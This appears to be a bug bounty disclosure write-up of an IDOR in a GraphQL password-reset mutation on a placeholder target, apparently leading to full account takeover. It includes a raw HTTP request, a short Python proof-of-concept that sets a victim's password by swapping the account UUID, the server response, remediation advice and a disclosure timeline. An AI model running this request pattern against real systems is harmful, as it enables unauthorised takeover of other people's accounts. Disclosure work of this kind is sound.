---
title: "Critical IDOR to Full Account Takeover on Target Enterprise API"
description: "How an Insecure Direct Object Reference in a GraphQL mutation allowed unauthorized password resets and account takeover, resulting in a $3,500 bounty award."
pubDate: "2024-03-20"
author: "MrR0807"
categories: ["Bug Bounty", "Web Security"]
tags: ["idor", "account-takeover", "graphql", "api", "bounty"]
pin: true
severity: "Critical"
bounty: "$3,500"
cvss: "9.1"
---
# Executive Summary



During a bug bounty engagement on a private enterprise scope, I discovered a critical **Insecure Direct Object Reference (IDOR)** vulnerability affecting the user password reset and session migration GraphQL endpoint.



By manipulating the `account_uuid` identifier without validating session tokens, an attacker could force password reset confirmation on arbitrary user accounts—leading to complete **Account Takeover (ATO)** with zero user interaction.



---



## Vulnerability Details



- **Vulnerability Type**: Insecure Direct Object Reference (IDOR) / Broken Object Level Authorization (BOLA)

- **Severity**: Critical (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N - **9.1**)

- **Bounty Awarded**: **$3,500**

- **Impact**: Full Account Takeover across all registered organization users.



---



## Technical Walkthrough & Proof of Concept



### 1. Endpoint Discovery



While proxying traffic through Burp Suite, I observed the GraphQL mutation used during the final step of password recovery:



```http

POST /api/v2/graphql HTTP/1.1

Host: target-app.com

Content-Type: application/json

Authorization: Bearer <GUEST_TOKEN>



{

  "operationName": "ConfirmPasswordReset",

  "query": "mutation ConfirmPasswordReset($input: PasswordResetInput!) { confirmPasswordReset(input: $input) { success message } }",

  "variables": {

    "input": {

      "account_uuid": "victim-uuid-773a-4421",

      "reset_token": "valid_token_or_null",

      "new_password": "HackedPassword123!"

    }

  }

}

```



### 2. Exploitation Vector



When testing parameter substitution:

1. Triggered password reset flow for attacker test account (`attacker@test.com`, UUID `attacker-uuid-1122`).

2. Captured the confirmation request in Burp Repeater.

3. Swapped `account_uuid` with the target victims UUID (`victim-uuid-773a-4421`).

4. Sent the request. The backend failed to check if the `reset_token` matched the specified `account_uuid`!



```bash

# Automated PoC exploit script in Python

import requests



url = "https://target-app.com/api/v2/graphql"

headers = {"Content-Type": "application/json"}



payload = {

    "operationName": "ConfirmPasswordReset",

    "query": "mutation ConfirmPasswordReset($input: PasswordResetInput!) { confirmPasswordReset(input: $input) { success message } }",

    "variables": {

        "input": {

            "account_uuid": "VICTIM_UUID_HERE",

            "reset_token": "ANY_ACTIVE_TOKEN",

            "new_password": "NewCompromisedPassword1337!"

        }

    }

}



response = requests.post(url, json=payload, headers=headers)

print(f"Status: {response.status_code}")

print(f"Response: {response.json()}")

```



### 3. Response



```json

{

  "data": {

    "confirmPasswordReset": {

      "success": true,

      "message": "Password updated successfully."

    }

  }

}

```



The victims account password was immediately updated to the attackers supplied password.



---



## Remediation



1. **Strict Token-to-User Binding**: Ensure password reset tokens are cryptographically linked to the specific `user_id` inside the database / cache layer and invalidated immediately after use.

2. **Server-side Validation**: Derive user identity exclusively from the verified token rather than accepting arbitrary user identifiers in client input payloads.



---



## Disclosure Timeline



- **2024-03-20**: Vulnerability discovered & submitted via HackerOne.

- **2024-03-20**: Triage confirmed with **Critical** severity.

- **2024-03-21**: Vendor deployed fix to production.

- **2024-03-22**: Fix verified; **$3,500 Bounty** awarded.

- **2024-04-15**: Coordinated public disclosure agreed.

